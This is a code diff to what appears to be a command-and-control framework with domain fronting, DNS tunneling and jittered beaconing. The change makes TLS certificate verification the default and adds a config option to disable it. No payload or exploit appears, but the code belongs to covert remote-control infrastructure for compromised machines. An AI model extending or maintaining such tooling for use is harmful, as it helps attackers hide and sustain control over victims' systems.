@@ -85,6 +85,9 @@ class C2Config:
     # DNS tunneling
     dns_domain: Optional[str] = None
     dns_subdomain_length: int = 32
+    
+    # SSL/TLS Security
+    verify_ssl: bool = True
 
 
 @dataclass
@@ -282,14 +285,10 @@ class DomainFronter:
             # Create SSL context
             # Create SSL context (Hardened)
             # Create SSL context (Strategic Hardened TLS 1.2+)
-            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            context = ssl.create_default_context()
             context.minimum_version = ssl.TLSVersion.TLSv1_2
             
-            if self.verify_ssl:
-                context.load_default_certs()
-                context.check_hostname = True
-                context.verify_mode = ssl.CERT_REQUIRED
-            else:
+            if not self.verify_ssl:
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
             
@@ -775,12 +774,14 @@ class C2Channel:
                 method="POST"
             )
             
-            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            context = ssl.create_default_context()
             context.minimum_version = ssl.TLSVersion.TLSv1_2
-            # Beaconing often uses infrastructure with non-matching certs, 
-            # but we still want encrypted channel.
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
+            
+            if not getattr(self.config, 'verify_ssl', True):
+                # Beaconing often uses infrastructure with non-matching certs, 
+                # but we allow disabling verification via config.
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
             
             with urllib.request.urlopen(request, timeout=30, context=context) as response:
                 return True, response.read()
@@ -901,7 +902,6 @@ def create_fronted_channel(
 
 def create_dns_channel(
     c2_domain: str,
-    dns_server: str = "8.8.8.8",
     sleep_interval: int = 120,
     jitter_min: int = 15,
     jitter_max: int = 30
@@ -911,7 +911,6 @@ def create_dns_channel(
     
     Args:
         c2_domain: Base domain for DNS queries
-        dns_server: DNS resolver to use
         sleep_interval: Base check-in interval
         jitter_min: Minimum jitter percentage
         jitter_max: Maximum jitter percentage
